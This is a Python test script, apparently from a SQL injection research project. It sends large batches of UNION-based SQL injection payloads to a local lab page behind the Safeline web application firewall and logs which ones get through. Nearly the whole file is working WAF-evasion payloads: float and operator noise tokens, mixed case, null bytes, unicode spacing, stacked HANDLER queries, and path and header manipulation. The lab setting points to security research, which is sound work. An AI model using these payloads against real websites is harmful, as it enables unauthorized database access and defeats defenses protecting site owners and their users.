"""
bypass_lab/test_creative.py
============================
Creative bypass techniques — context confusion against ML tokenizer.

Key concept: inject "noise tokens" (float literals, operators, unusual
expressions) between SQL keywords to break Safeline's pattern recognition.
The ML model was trained on `QUOTE → UNION → SELECT` sequences; inserting
an unexpected token type in between breaks that learned pattern.

Run:
    python3 -m bypass_lab.test_creative
"""
import sys, time, http.client, urllib.parse
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

WAF   = "http://localhost:8888/Less-1/"
PLAIN = "http://localhost:8081/Less-1/"
M     = "'SEQSQLI_START','SEQSQLI_END'"
FOUND = []


def t(label, payload, url=WAF):
    try:
        r = requests.get(url, params={"id": payload}, timeout=8)
        ok = classify_response(r.text, r.status_code, "union", strict_markers=True) == "SUCCESS"
        s  = r.status_code
        tag = "*** BYPASS ***" if ok else ("BLOCK" if s == 403 else str(s))
        print(f"  [{tag}] {label[:55]}")
        if ok:
            FOUND.append((label, payload))
        time.sleep(0.2)
        return ok
    except Exception as e:
        print(f"  [ERR] {label}: {e}")
        return False


# ── A: Float token noise between quote and UNION ─────────────────────
def section_a():
    print("\n[A] Float/numeric token between ' and UNION")
    noises = [
        ".0", ".1", ".6e0", "-.6e0", ".0e0", "1e-1", ".1e1",
        "0.", "1.", "-0.", "1.0e0", ".6E0", "1E0", ".0E1",
        ".1e-1", "1.e0", ".1e+0", "0e0", "00e0",
        ".2e0", ".3e0", ".4e0", ".5e0", ".7e0", ".8e0", ".9e0",
        "2e0", "3e0", "10e-1", "100e-2",
    ]
    for n in noises:
        t(f"noise={n}", f"-1'{n} UNION SELECT database(),{M}-- -")
        t(f"noise={n}+case", f"-1'{n} uNiOn sElEcT database(),{M}-- -")
        t(f"noise={n}+tab", f"-1'{n}\tUNION\tSELECT\tdatabase(),{M}-- -")


# ── B: Float noise between UNION and SELECT ───────────────────────────
def section_b():
    print("\n[B] Float noise between UNION and SELECT")
    for n in [".0", ".6e0", "1e0", ".1", "0.", "1e-0", ".2", ".0e1"]:
        t(f"U{n}S bare",  f"-1' UNION{n}SELECT database(),{M}-- -")
        t(f"U {n} S",     f"-1' UNION {n} SELECT database(),{M}-- -")
        t(f"U+case {n}",  f"-1' uNiOn{n}sElEcT database(),{M}-- -")


# ── C: Noise in ALL positions ─────────────────────────────────────────
def section_c():
    print("\n[C] Noise in all keyword positions")
    for n in [".6e0", "1e-0", ".0", ".1e0", ".0e1"]:
        t(f"all-{n}", f"-1'{n}UNION{n}SELECT{n}database(),{M}-- -")
        t(f"all-{n}-case", f"-1'{n}uNiOn{n}sElEcT{n}dAtAbAsE(),{M}-- -")
        t(f"all-{n}+null", f"-1'{n}UNION{n}SELECT{n}database(),{M};%00")


# ── D: Operator-based separators ─────────────────────────────────────
def section_d():
    print("\n[D] Operator tokens as separators")
    ops = [
        ("minus -0",     f"-1'-0 UNION SELECT database(),{M}-- -"),
        ("plus +0",      f"-1'+0 UNION SELECT database(),{M}-- -"),
        ("xor ^0",       f"-1'^0 UNION SELECT database(),{M}-- -"),
        ("bitand &-1",   f"-1'&-1 UNION SELECT database(),{M}-- -"),
        ("bitor |-1",    f"-1'|-1 UNION SELECT database(),{M}-- -"),
        ("lshift <<0",   f"-1'<<0 UNION SELECT database(),{M}-- -"),
        ("rshift >>0",   f"-1'>>0 UNION SELECT database(),{M}-- -"),
        ("not-not !!0",  f"-1'!!0 UNION SELECT database(),{M}-- -"),
        ("tilde ~(-1)",  f"-1'~(-1) UNION SELECT database(),{M}-- -"),
        ("- -1",         f"-1'- -1 UNION SELECT database(),{M}-- -"),
        ("+ +1",         f"-1'+ +1 UNION SELECT database(),{M}-- -"),
        ("-0.0",         f"-1'-0.0 UNION SELECT database(),{M}-- -"),
        ("+0.0",         f"-1'+0.0 UNION SELECT database(),{M}-- -"),
        ("-1e0+1e0",     f"-1'-1e0+1e0 UNION SELECT database(),{M}-- -"),
        (".6e0-.6e0",    f"-1'.6e0-.6e0 UNION SELECT database(),{M}-- -"),
    ]
    for label, p in ops:
        t(label, p)


# ── E: Structural alternatives ────────────────────────────────────────
def section_e():
    print("\n[E] Structural alternatives (non-UNION paths)")
    alts = [
        ("natural join",
         f"-1' NATURAL JOIN(SELECT database() a,{M} b,c c)-- -"),
        ("into @var",
         f"-1' UNION SELECT @a:=database(),{M}-- -"),
        ("handler open",
         f"1'; HANDLER users OPEN a; HANDLER a READ FIRST; HANDLER a CLOSE-- -"),
        ("case when then",
         f"-1' UNION SELECT CASE WHEN 1=1 THEN database() END,{M}-- -"),
        ("if func",
         f"-1' UNION SELECT IF(1,database(),'x'),{M}-- -"),
        ("elt func",
         f"-1' UNION SELECT ELT(1,database()),{M}-- -"),
        ("make_set func",
         f"-1' UNION SELECT MAKE_SET(1,database()),{M}-- -"),
        ("export_set func",
         f"-1' UNION SELECT EXPORT_SET(1,database(),'n',',',1),{M}-- -"),
        ("coalesce null",
         f"-1' UNION SELECT COALESCE(NULL,database()),{M}-- -"),
        ("paren union",
         f"-1'UNION(SELECT database(),{M})-- -"),
        ("paren+case",
         f"-1'uNiOn(sElEcT database(),{M})-- -"),
        ("dual table",
         f"-1' UNION SELECT database(),{M} FROM DUAL-- -"),
        ("dual+case",
         f"-1' uNiOn sElEcT database(),{M} fRoM dUaL-- -"),
        ("reverse double",
         f"-1' UNION SELECT REVERSE(REVERSE(database())),{M}-- -"),
    ]
    for label, p in alts:
        t(label, p)


# ── F: URL path tricks ────────────────────────────────────────────────
def section_f():
    print("\n[F] URL path manipulation")
    payload = f"-1' UNION SELECT database(),{M}-- -"
    paths = [
        ("/Less-1//",          "double slash"),
        ("/Less-1/./",         "dot-slash"),
        ("/Less-1/../Less-1/", "traversal"),
        ("/Less-1%2F",         "encoded slash"),
        ("/LESS-1/",           "uppercase"),
        ("/Less-1/index.php",  "explicit php"),
        ("/Less-1/?",          "empty query sep"),
    ]
    for path, label in paths:
        try:
            r = requests.get(
                f"http://localhost:8888{path}",
                params={"id": payload}, timeout=8)
            ok = classify_response(r.text, r.status_code, "union",
                                   strict_markers=True) == "SUCCESS"
            tag = "*** BYPASS ***" if ok else f"HTTP {r.status_code}"
            print(f"  [{tag}] path: {label}")
            if ok:
                FOUND.append((f"path:{label}", payload))
        except Exception as e:
            print(f"  [ERR] path:{label}: {e}")
        time.sleep(0.2)


# ── G: Raw HTTP tricks ────────────────────────────────────────────────
def section_g():
    print("\n[G] Raw HTTP: version / header tricks")
    payload = f"-1' UNION SELECT database(),{M}-- -"
    q = urllib.parse.quote(payload)

    def raw_req(path, headers_extra="", version="HTTP/1.0"):
        try:
            conn = http.client.HTTPConnection("localhost", 8888, timeout=8)
            conn._http_vsn_str = version
            conn._http_vsn = 10 if "1.0" in version else 11
            conn.putrequest("GET", path, skip_accept_encoding=True)
            conn.putheader("Host", "localhost")
            if headers_extra:
                for k, v in headers_extra.items():
                    conn.putheader(k, v)
            conn.endheaders()
            resp = conn.getresponse()
            body = resp.read().decode("latin-1", errors="replace")
            ok = classify_response(body, resp.status, "union",
                                   strict_markers=True) == "SUCCESS"
            tag = "*** BYPASS ***" if ok else f"HTTP {resp.status}"
            print(f"  [{tag}] {version} {path[:50]}")
            if ok:
                FOUND.append((version, path))
            conn.close()
        except Exception as e:
            print(f"  [ERR] {version}: {e}")
        time.sleep(0.2)

    raw_req(f"/Less-1/?id={q}", version="HTTP/1.0")
    raw_req(f"/Less-1/?id={q}", version="HTTP/1.1")
    # With unusual headers
    raw_req(f"/Less-1/?id={q}",
            headers_extra={"X-Forwarded-For": "127.0.0.1",
                           "X-Real-IP": "127.0.0.1"})
    raw_req(f"/Less-1/?id={q}",
            headers_extra={"Accept-Encoding": "identity"})


# ── H: Content-type & Accept tricks ──────────────────────────────────
def section_h():
    print("\n[H] Content-Type / Accept header tricks")
    payload = f"-1' UNION SELECT database(),{M}-- -"
    hdrs_list = [
        ("accept json",     {"Accept": "application/json"}),
        ("accept xml",      {"Accept": "application/xml"}),
        ("accept text",     {"Accept": "text/plain"}),
        ("x-requested-with", {"X-Requested-With": "XMLHttpRequest"}),
        ("accept-lang",     {"Accept-Language": "zh-CN,zh;q=0.9"}),
        ("origin bypass",   {"Origin": "http://localhost"}),
        ("content text",    {"Content-Type": "text/plain"}),
    ]
    for label, extra in hdrs_list:
        try:
            r = requests.get(WAF, params={"id": payload},
                             headers={**{"User-Agent": "Mozilla/5.0"}, **extra},
                             timeout=8)
            ok = classify_response(r.text, r.status_code, "union",
                                   strict_markers=True) == "SUCCESS"
            tag = "*** BYPASS ***" if ok else f"HTTP {r.status_code}"
            print(f"  [{tag}] {label}")
            if ok:
                FOUND.append((label, payload))
        except Exception as e:
            print(f"  [ERR] {label}: {e}")
        time.sleep(0.2)


# ── I: MySQL string tricks ────────────────────────────────────────────
def section_i():
    print("\n[I] MySQL string & escape tricks")
    tests = [
        ("escape Z \\Z",
         f"-1'\x1a UNION SELECT database(),{M}-- -"),
        ("escape b \\b",
         f"-1'\x08 UNION SELECT database(),{M}-- -"),
        ("escape v \\v",
         f"-1'\x0b UNION SELECT database(),{M}-- -"),
        ("null in id then union",
         f"-1\x00' UNION SELECT database(),{M}-- -"),
        ("nul between keywords",
         f"-1' UNION\x00SELECT database(),{M}-- -"),
        ("bom utf8 before union",
         f"-1' \xef\xbb\xbf UNION SELECT database(),{M}-- -"),
        ("unicode ZERO WIDTH",
         f"-1' ​UNION​SELECT​database(),{M}-- -"),
        ("unicode NARROW NBSP",
         f"-1'  UNION SELECT database(),{M}-- -"),
        ("unicode EM SPACE",
         f"-1'  UNION SELECT database(),{M}-- -"),
        ("unicode IDEOGRAPHIC SPACE",
         f"-1' 　UNION　SELECT　database(),{M}-- -"),
    ]
    for label, p in tests:
        t(label, p)


# ── Summary ────────────────────────────────────────────────────────────
def summary():
    print("\n" + "=" * 60)
    print(f" TOTAL BYPASSES: {len(FOUND)}")
    print("=" * 60)
    for label, p in FOUND:
        print(f"\n  Label  : {label}")
        print(f"  Payload: {p[:120]}")


if __name__ == "__main__":
    print("=" * 60)
    print(" Creative Bypass Test — Safeline CE")
    print("=" * 60)
    section_a()
    section_b()
    section_c()
    section_d()
    section_e()
    section_f()
    section_g()
    section_h()
    section_i()
    summary()
